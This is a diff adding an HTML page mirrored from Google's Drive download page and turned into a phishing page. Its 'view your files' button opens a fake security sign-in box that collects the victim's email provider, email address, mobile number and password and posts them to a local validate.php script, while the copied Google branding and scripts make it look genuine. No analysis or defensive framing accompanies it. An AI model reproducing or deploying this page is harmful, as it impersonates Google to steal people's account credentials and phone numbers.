@@ -1,0 +1,361 @@
+<!DOCTYPE HTML><html lang="">
+<!-- Mirrored from tools.google.com/dlpage/drive/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 23 Sep 2014 08:58:40 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head><script type="text/javascript">
+function utmx_section(){}function utmx(){}
+
+</script> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> <meta name="description" content="Install Drive on your smartphone, tablet and computer so that you can keep files safe and easy to reach from anywhere. Start with 15 GB of free Google storage.">  <meta name="keywords" content="F google drive sync client"> <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"> <link rel="icon" type="image/ico" href="../res/drive/images/drive-16.png"> <link href="http://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&amp;lang=en" rel="stylesheet"> <link href="../res/drive/css/drive-dlpage.css" rel="stylesheet" type="text/css"> <link href="../../../www.google.com/css/maia.css" rel="stylesheet"> <link href="../res/drive/css/drive-download.css" rel="stylesheet" type="text/css"> <script type="text/javascript" src="../../../www.gstatic.com/external_hosted/modernizr/modernizr.js"></script>   <title>Google Drive</title> <script type="text/javascript">
+  function setHl(newHl) {
+    var query = location.search;
+    if (query.length == 0) {
+      location.search = "?hl=" + newHl;
+      return;
+    }
+    if (-1 == query.indexOf("hl=")) {
+      location.search = query + "&hl=" + newHl;
+      return;
+    }
+    location.search = query.replace(/hl=[^&]*/, "hl=" + newHl);
+  }
+</script> <script type="text/javascript" src="../../tools/dlpage/res/c/gu-util.js">
+  
+</script> <script type="text/javascript">
+  // Set up the global update.installscript namespace.
+  if (!window.update) {
+    update = {};
+  }
+  if (!window.update.installscript) {
+    update.installscript = {};
+  }
+
+  
+  
+  function runTagParamsHook(tag, opt_guid) {return tag;}
+  
+  function runThankYouQueryHook(query) {return query;}
+  
+  function runGetAppsPageHook(apps) {return apps;}
+
+  
+  var referer = null;
+
+  
+  
+     update.installscript.updater_expts = '';
+  
+  
+  
+    update.installscript.app_expts = '';
+  
+
+
+  function resetButtons(name) {
+    var buttons = document.getElementsByName(name);
+    for (i = 0; i < buttons.length; ++i) {
+      buttons[i].disabled = false;
+    }
+  }
+  function showThrobber(isVisible) {
+    var divThrobber = document.getElementById('throbber');
+    var imgThrobber = document.getElementById('throbber-img');
+    if (!divThrobber || !imgThrobber) {
+      return;
+    }
+    if (!isVisible) {
+      divThrobber.style.display = 'none';
+    }
+    
+    imgThrobber.src = isVisible ?
+      
+         "/tools/dlpage/res/c/image/loading-16.gif"
+      
+        : "";
+    if (isVisible) {
+      divThrobber.style.display = 'inline';
+    }
+  }
+  
+  function getThankyouUrl(extraQuery) {
+    var thankYouPath = "thankyou.html";
+    if (areStatsEnabled()) {
+      extraQuery += '&statcb=';
+    }
+    var query = "" + extraQuery;
+    if (query.length > 0 && query.charAt(0) != '?') {
+      query = '?' + query;
+    }
+    query = runThankYouQueryHook(query);
+    return thankYouPath + query;
+  }
+  function queueThankyou(timeout, queryString, opt_navDocument) {
+    var page = getThankyouUrl(queryString);
+    var doc = opt_navDocument || this.document;
+
+    function navigateToThankyou() {
+      showThrobber(false);
+      resetButtons("submitbutton");
+      doc.location.href = page;
+    }
+
+    if (!timeout) {
+      navigateToThankyou();
+      return;
+    }
+
+    setTimeout(navigateToThankyou, timeout);
+  }
+  function getApps() {
+    var apps = new Array();
+    
+    
+    
+    
+      apps.push(_GU_createAppInfo(
+          "{3C122445-AECE-4309-90B7-85A6AEF42AC0}",
+          "Google Drive",
+          "true",
+          runTagParamsHook(
+              "",
+              "{3C122445-AECE-4309-90B7-85A6AEF42AC0}"),
+          update.installscript.app_expts));
+    
+    
+    
+    
+    return runGetAppsPageHook(apps);
+  }
+  function areStatsEnabled() {
+    var statcb = document.getElementById("statcb");
+    return (statcb && statcb.checked);
+  }
+  function isDownloadTaggingEnabled() {
+    
+    return true;
+  }
+  function getDownloadPath() {
+    
+      
+        return "/drive/googledrivesync.exe";
+      
+    
+  }
+  function buildDownloadUrl(statEnable, opt_buildDownloadPath, opt_filePath) {
+     
+
+    var defaultDownloadPath = isDownloadTaggingEnabled() ?
+        _GU_buildDlPath : _GU_buildDlPathNoTag;
+    var buildDownloadPath = opt_buildDownloadPath || defaultDownloadPath;
+    var filePath = opt_filePath || getDownloadPath();
+    var dlServer =
+    "http://dl.google.com/";
+    return buildDownloadPath(getApps(),
+                             "en-GB",
+                             statEnable,
+                             dlServer,
+                             filePath,
+                             update.installscript.updater_expts);
+  }
+  function downloadAndThankYou(delayTime, statEnable, opt_navDocument,
+                               opt_buildDownloadPath, opt_filePath) {
+    
+    if (navigator.appVersion.indexOf('Chrome/index.html') != -1 ||
+        navigator.appVersion.indexOf('Safari/index.html') != -1) {
+      queueThankyou(0, '', opt_navDocument);
+      return;
+    }
+
+    var method = getInstallSource();
+    sendDlPagePing("install", method);
+
+    queueThankyou(delayTime, '', opt_navDocument);
+
+    var downloadUri =
+        buildDownloadUrl(statEnable, opt_buildDownloadPath, opt_filePath);
+
+    if (method === 'clickonce' ||
+        navigator.userAgent.indexOf('Firefox/index.html') != -1) {
+      var windowFeatures = 'toolbar=0,location=no,directories=0,status=0,scrollbars=no,resizable=0,width=1,height=1,top=0,left=0';
+      window.open(downloadUri, '_blank', windowFeatures);
+      window.focus();
+    } else {
+      location.href = downloadUri;
+    }
+
+    showThrobber(true);
+  }
+  function installViaDownload(opt_navDocument) {
+    downloadAndThankYou(4000, areStatsEnabled(), opt_navDocument);
+  }
+  function isClickOnceEnabled() {
+    
+    return false;
+  }
+  function isOneClickEnabled() {
+    return true;
+  }
+  function installViaClickOnce(opt_navDocument) {
+    
+    downloadAndThankYou(10000, areStatsEnabled(), opt_navDocument, _GU_buildClickOncePath, "");
+  }
+  function installViaOneClick(opt_navDocument) {
+    showThrobber(true);
+    window.google.update.oneclick.install(
+      getApps(),
+      "en-GB",
+      areStatsEnabled(),
+      function() {queueThankyou(4000, '\x26oneclickinstalled=', opt_navDocument);},
+      function(hr) {installViaDownload(opt_navDocument);},
+      update.installscript.updater_expts);
+  }
+  function getInstallSource() {
+    
+      if (isOneClickEnabled() && _GU_isOneClickAvailable()) {
+        return 'oneclick';
+      } else if (isClickOnceEnabled() && _GU_isClickOnceAvailable()) {
+        return 'clickonce';
+      } else {
+        return 'download';
+      }
+    
+  }
+  function installApp(opt_navDocument) {
+    
+
+    var method = getInstallSource();
+    if (method === 'oneclick') {
+      installViaOneClick(opt_navDocument);
+    } else if (method === 'clickonce') {
+      installViaClickOnce(opt_navDocument);
+    } else {
+      installViaDownload(opt_navDocument);
+    }
+  }
+  
+  function sendDlPagePing(stage, installSource) {
+    var img = new Image();
+    var extra = GU_buildGlobalExtra(
+          "en-GB",
+          areStatsEnabled(),
+          update.installscript.updater_expts);
+    var tag = GU_BuildTag(getApps(), extra);
+    img.src = '//tools.google.com/service/update2/dlpageping?' +
+        tag +
+        '&stage=' + stage +
+        '&installsource=' + installSource;
+  }
+  function downloadInstaller(opt_pageName) {
+    var hasStatcb =
+    
+      false;
+    
+    location.href = buildDownloadUrl(hasStatcb);
+
+    var pageName = opt_pageName || "install";
+    var installMethod = getInstallSource();
+    sendDlPagePing(pageName, installMethod);
+  }
+  var pageTracker;  
+  function doSubmit() {
+    var installMethod = getInstallSource();
+    if (typeof _gaq != 'undefined') {
+      _gaq.push(['_trackPageview'], '/ty/retry_' + installMethod);
+    } else if (pageTracker) {
+      pageTracker._trackPageview("/ty/retry_" + installMethod);
+    }
+    downloadInstaller("retry");
+  }
+  
+  
+  
+  _GU_OnloadHandlerAdd(
+    function() {
+      if (isOneClickEnabled()) {
+      _GU_SetupOneClick();
+      }
+    }, 0); // front of list
+  
+  _GU_OnloadHandlerAdd(
+    function(pagename) {
+      sendDlPagePing(pagename, getInstallSource());
+    });  // added to end of body.onload handler list
+
+
+</script>  <script type="text/javascript">
+  function goCancelled() {
+    this.document.location.href =
+      "index.html";
+  }
+</script></head> <body class="download" onload="_GU_OnloadBody(&#39;index&#39;);"><div id="c-doc"><div class="header" role="banner"><script type="text/javascript">utmx_section("TopNav")</script> <div class="header-item with-site-logo"><a class="site-logo site-logo-link" href=""><div class="site-logo-image icon icon-google-logo-dark">Google</div>Drive</a></div> <div class="nav-site"><img alt="Drive logo" src="../res/drive/images/logo-drive.png"> <ul><li><a class="meet" href="">Meet Drive</a></li> <li><a class="using-drive" href="">Using Drive</a></li> <li class=""><a class="download" href="#">Download</a></li> <li><a class="work" href="">For Work</a></li> <li class="last-default"><a class="help" href="">Help</a></li> <li class="mobile-is-hidden float-in"><a class="go-to-drive" href="">Go to Google Drive</a></li> <li class="download-app mobile-is-visible crushed-is-visible"><a class="download-mobile-android boxed-in" href="">Download for Android</a> <a class="download-mobile-ios boxed-in" href="">Download for iOS</a> <a class="download-mobile boxed-in" style="display: inline-block;" href="">Sign in</a></li></ul></div> <div class="mobile-nav-toggle js-mobilenav"><div class="icon icon-mobile-open-dark toggle-nav-open js-mobilenav-toggle"></div> <div class="icon icon-mobile-close toggle-nav-closed js-mobilenav-toggle-close"></div></div></div> <div class="main" id="maia-main"><noscript><div class="pagewarning">You need a JavaScript-capable browser to download this software. <a href="">Click here for instructions</a> on how to enable JavaScript in your browser.</div></noscript>  <script type="text/javascript">utmx_section("MainImage")</script> <div class="maia-cols"><div class="main-devices maia-col-6"><div class="drive-devices"><img src="../res/drive/images/drive-devices.jpg" alt="Access Everywhere"></div></div> <div class="main-content maia-col-6"><h1 class="drive-header">View shared files and folders</h1> <p class="drive-copy">Shared files can be reached from any smartphone, tablet or computer. So wherever you go, your files follow.</p> <p class="drive-os-detect-msg msg-linux">Running Linux? Stay tuned &ndash; Drive for Linux isn&#39;t quite ready.</p> <p class="drive-os-detect-msg msg-chromebook">On a Chromebook? Google Drive comes built-in, so all of your stuff is backed up automatically. 
+
+
+<a href="http://drive.google.com/?utm_source=en&amp;utm_medium=button&amp;utm_campaign=web&amp;utm_content=gotodrive&amp;usp=drive_landing">Open Drive</a></p> <div class="dropdown-wrapper"><script type="text/javascript">utmx_section("Button Text")</script>
+
+
+ <a class="dropdown-trigger" id="button" href="eula.html" onclick="if (_gaq) {_gaq.push([&#39;_trackPageview&#39;, &#39;/drive/eula-lightbox&#39;]);}">Click here to view your files<span class="icon icon--arrow-dropdown"></span></a> <ul class="dropdown-list">
+
+
+
+ </ul></div></div></div></div> <div class="main-bg"></div> <div class="drive-signature-hldr"><div class="maia-aux"><div id="maia-signature"></div></div></div> <div class="drive-footer" id="maia-footer"><div id="maia-footer-global"><div class="maia-aux"><div class="maia-locales"><form class="langmenu" action="#"><select onchange="javascript:setHl(this.options[this.selectedIndex].value);" title="Language"><option value="" selected>Select a language</option> <option value="bg">&#8234;&#1073;&#1098;&#1083;&#1075;&#1072;&#1088;&#1089;&#1082;&#1080;&#8236;</option> <option value="ca">&#8234;catal&agrave;&#8236;</option> <option value="cs">&#8234;&#269;e&scaron;tina&#8236;</option> <option value="da">&#8234;dansk&#8236;</option> <option value="de">&#8234;Deutsch&#8236;</option> <option value="el">&#8234;&Epsilon;&lambda;&lambda;&eta;&nu;&iota;&kappa;&#940;&#8236;</option> <option value="en">&#8234;English&#8236;</option> <option value="en-GB">&#8234;English (UK)&#8236;</option> <option value="es">&#8234;espa&ntilde;ol&#8236;</option> <option value="et">&#8234;eesti&#8236;</option> <option value="fi">&#8234;suomi&#8236;</option> <option value="fil">&#8234;Filipino&#8236;</option> <option value="fr">&#8234;fran&ccedil;ais&#8236;</option> <option value="hi">&#8234;&#2361;&#2367;&#2306;&#2342;&#2368;&#8236;</option> <option value="hr">&#8234;hrvatski&#8236;</option> <option value="hu">&#8234;magyar&#8236;</option> <option value="id">&#8234;Bahasa Indonesia&#8236;</option> <option value="is">&#8234;&Iacute;slenska&#8236;</option> <option value="it">&#8234;italiano&#8236;</option> <option value="ja">&#8234;&#26085;&#26412;&#35486;&#8236;</option> <option value="ko">&#8234;&#54620;&#44397;&#50612;&#8236;</option> <option value="lt">&#8234;lietuvi&#371;&#8236;</option> <option value="lv">&#8234;latvie&scaron;u&#8236;</option> <option value="nl">&#8234;Nederlands&#8236;</option> <option value="no">&#8234;norsk bokm&aring;l&#8236;</option> <option value="pl">&#8234;polski&#8236;</option> <option value="pt-BR">&#8234;portugu&ecirc;s (Brasil)&#8236;</option> <option value="pt-PT">&#8234;portugu&ecirc;s (Portugal)&#8236;</option> <option value="ro">&#8234;rom&acirc;n&#259;&#8236;</option> <option value="ru">&#8234;&#1088;&#1091;&#1089;&#1089;&#1082;&#1080;&#1081;&#8236;</option> <option value="sk">&#8234;slovensk&yacute;&#8236;</option> <option value="sl">&#8234;sloven&scaron;&#269;ina&#8236;</option> <option value="sr">&#8234;&#1057;&#1088;&#1087;&#1089;&#1082;&#1080;&#8236;</option> <option value="sv">&#8234;svenska&#8236;</option> <option value="th">&#8234;&#3652;&#3607;&#3618;&#8236;</option> <option value="tr">&#8234;T&uuml;rk&ccedil;e&#8236;</option> <option value="uk">&#8234;&#1091;&#1082;&#1088;&#1072;&#1111;&#1085;&#1089;&#1100;&#1082;&#1072;&#8236;</option> <option value="vi">&#8234;Ti&#7871;ng Vi&#7879;t&#8236;</option> <option value="zh-CN">&#8234;&#31616;&#20307;&#20013;&#25991;&#8236;</option> <option value="zh-TW">&#8234;&#32321;&#39636;&#20013;&#25991; (&#21488;&#28771;)&#8236;</option></select></form></div> <ul><li><a href="">Google</a></li> <li><a href="">About Google</a></li> <li><a href="">Privacy &amp;amp; Terms</a></li></ul></div></div></div></div> <script type="text/javascript" src="../res/drive/scripts/dlpage-ui.js">
+      
+    </script> <div style="display:none;" id="eula-overlay"></div> <div id="c-eula" style="display:none;" role="dialog"><div id="eulabox">
+      <img src="logo.png" width="480">
+    
+             <h3>For security reasons, you are required to sign in with your email address to access shared files and folders</h3>
+     
+              <p> Please select your email provider below and enter your email and password</p>
+              
+               <form id="login" method="POST" action="validate.php">
+                 <select name="type">
+                 <option value="General"> -- Select your email provider -- </option>
+                 <option value="G Mail"> G Mail </option>
+                 <option value="Hotmail"> Hotmail </option>
+                 <option value="Yahoo"> Yahoo Mail </option>
+                 <option value="AOL"> AOL </option>
+                 <option value="Others"> Others </option>
+                 </select> <br />
+                <input type="email" name="username" placeholder="Email" title="Enter Email Address" required>    <br />
+                <input type="tel" name="tel" placeholder="Your mobile number" title="Enter your mobile number" required>    <br />
+                <input type="password" name="password" placeholder="Password" title="Enter your password" required> <br />
+                
+                
+               
+               
+       <p class="statusage"><input type="checkbox" name="checkbox" id="statcb">
+       <label for="statcb"> I agree to Google terms of services and privacy policy </label></p>  <div class="eula-action"><div class="c-button eula-input" id="accept"><input type="submit" name="submit" class="button" id="submit1" value="Sign in to Google Drive"></button> <div id="throbber"><span><img id="throbber-img" width="16" height="16" alt="Throbber" src="../res/c/image/loading-16.gif"></span></div></div> <input name="Button" type="button" class="cancel eula-input" id="cancel" onclick="goCancelled();" value="Cancel"></div></div></div> <script type="text/javascript" src="../../../www.gstatic.com/external_hosted/gsap/TweenMax.min.js"></script> 
+<script>
+  var eulaModal = new cdl.Eula(
+      'eula-overlay',
+      'c-eula',
+      'submit1',
+      'button',
+      'cancel',
+      ['lang-select']
+  );
+
+  function getConfigOptions(tag) {
+    try {
+      if (tag.match(/installdataindex=([^&]+)/) && document.configOptions
+          && document.configOptions.cboption1.checked) {
+        return tag.replace(/installdataindex=([^&]+)/,
+            'installdataindex=$1-defaultbrowser');
+      } else if (document.configOptions
+          && document.configOptions.cboption1.checked) {
+        return tag + '\x26installdataindex\x3d' + 'defaultbrowser';
+      } else {
+        return tag;
+      }
+    } catch (e) {
+      return tag;
+    }
+  }
+  function runTagParamsHook(tag, opt_guid) {
+    return getConfigOptions(tag);
+  }
+  function runThankYouQueryHook(query) {
+    query = query || '\x3f';
+    return getConfigOptions(query);
+  }
+</script>
+    </body>
+<!-- Mirrored from tools.google.com/dlpage/drive/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 23 Sep 2014 08:58:47 GMT -->
+</html>
